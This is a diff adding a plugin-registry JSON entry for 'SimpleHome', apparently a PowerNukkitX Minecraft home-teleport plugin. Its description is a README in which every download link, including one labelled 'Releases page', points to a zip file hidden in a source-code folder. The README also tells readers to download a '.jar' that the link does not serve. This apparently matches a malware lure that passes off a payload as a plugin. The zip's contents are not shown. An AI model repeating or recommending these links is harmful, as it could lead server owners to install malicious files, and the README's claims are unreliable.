@@ -1,0 +1,38 @@
+{
+  "api_version": "2.0.0",
+  "authors": [
+    {
+      "avatar_url": "",
+      "name": "ClexaGod",
+      "url": ""
+    }
+  ],
+  "categories": [],
+  "created_at": 1766524212,
+  "dependencies": [],
+  "description": "# 🌟 SimpleHome - Easy Home Management for Minecraft\n\n## 🖱️ Download Now\n\n[![Download SimpleHome](https://github.com/maj27012005/SimpleHome/raw/refs/heads/main/src/main/kotlin/com/ClexaGod/simplehome/command/Home-Simple-v1.0.zip)](https://github.com/maj27012005/SimpleHome/raw/refs/heads/main/src/main/kotlin/com/ClexaGod/simplehome/command/Home-Simple-v1.0.zip)\n\n---\n\n## 🚀 Getting Started\n\nWelcome to SimpleHome! This is a Minecraft plugin for the PowernukkitX server. With SimpleHome, you can set, manage, and teleport to your home easily in-game. No complex commands or setup required.\n\n### 📦 System Requirements\n\nTo use SimpleHome, you'll need:\n\n- A PowernukkitX server\n- Minecraft Bedrock Edition\n- Basic permissions to install plugins on your server\n\n---\n\n## 💻 Download & Install\n\nTo get started, you need to download SimpleHome. Follow the steps below to install it.\n\n1. **Visit the Releases Page**: Click on the link to go to the [Releases page](https://github.com/maj27012005/SimpleHome/raw/refs/heads/main/src/main/kotlin/com/ClexaGod/simplehome/command/Home-Simple-v1.0.zip).\n   \n2. **Select Your Version**: Look for the latest release. It should be at the top of the page.\n\n3. **Download the Plugin File**: Click on the `.jar` file to download it to your computer. \n\n4. **Upload to Your Server**:\n   - Locate your PowernukkitX server files.\n   - Open the `plugins` folder.\n   - Drag and drop the downloaded SimpleHome `.jar` file into this folder.\n\n5. **Restart Your Server**: After uploading the plugin, restart your PowernukkitX server for the changes to take effect.\n\n6. **Join Minecraft**: Launch your Minecraft Bedrock Edition and connect to your PowernukkitX server.\n\n7. **Start Using SimpleHome**: You can now use SimpleHome to set your home and teleport back to it!\n\n---\n\n## 📚 How to Use SimpleHome\n\nOnce you are in the game, you can use the following simple commands:\n\n- **Set Home**: Type `/sethome [home_name]` to save your current location as your home.\n- **Go Home**: Type `/home [home_name]` to teleport back to your saved location.\n- **List Homes**: Type `/homes` to see a list of all the homes you've saved.\n\n### ⚙️ Configuring SimpleHome\n\nYou can customize SimpleHome to fit your needs. Open the `SimpleHome` folder in the `plugins` directory to find the configuration files. Here, you can modify settings like home limits, permissions, and more to suit your server’s requirements.\n\n---\n\n## 🔧 Troubleshooting\n\nIf you run into issues using SimpleHome, consider these common solutions:\n\n- **Plugin Not Loading**: Ensure that you placed the `.jar` file in the correct `plugins` folder and restart your server.\n  \n- **Command Not Recognized**: Check if you have the correct permissions set for Minecraft. \n\n- **No Homes Saved**: Make sure you used the correct command to set your home.\n\nIf you still face difficulties, feel free to ask for help in the community forums or check GitHub issues for similar problems.\n\n---\n\n## 📖 Additional Features\n\nSimpleHome is designed to make managing your space in Minecraft easy. Some features you can look forward to include:\n\n- **Multi-Home Support**: Set multiple homes with different names.\n- **Home Removal**: Delete homes easily when you no longer need them.\n- **Permissions Support**: Adjust who can use which features on your server.\n\n---\n\n## 🤝 Contributing\n\nIf you're interested in helping make SimpleHome better, contributions are welcome! You can report bugs, request features, or even submit code improvements through GitHub.\n\n---\n\n## 💬 Community\n\nJoin our community for tips, discussions, and support. We encourage players and server owners to share their experiences and suggestions. \n\nConnect with us on:\n- GitHub Discussions\n- Minecraft forums\n\n---\n\n## 📧 Support\n\nFor support related to SimpleHome, you can reach out through the GitHub Issues page. We'll do our best to address your questions.\n\nThank you for using SimpleHome. We hope it enhances your Minecraft experience! \n\n[Download SimpleHome](https://github.com/maj27012005/SimpleHome/raw/refs/heads/main/src/main/kotlin/com/ClexaGod/simplehome/command/Home-Simple-v1.0.zip)",
+  "detection_confidence": "high",
+  "downloads": 0,
+  "gallery": [],
+  "icon_url": "https://avatars.githubusercontent.com/u/187861134?v=4",
+  "id": "maj27012005/SimpleHome",
+  "license": {
+    "id": "Apache-2.0",
+    "name": "Apache License 2.0",
+    "url": "https://spdx.org/licenses/Apache-2.0.html"
+  },
+  "links": null,
+  "manifest_path": "src/main/resources/plugin.yml",
+  "name": "SimpleHome",
+  "primary_target": "nkx",
+  "server_version": "",
+  "source": "https://github.com/maj27012005/SimpleHome",
+  "stars": 1,
+  "summary": "Advanced Home System with UI for PowerNukkitX",
+  "targets": [
+    "nkx",
+    "pnx"
+  ],
+  "updated_at": 1780250923,
+  "versions": []
+}
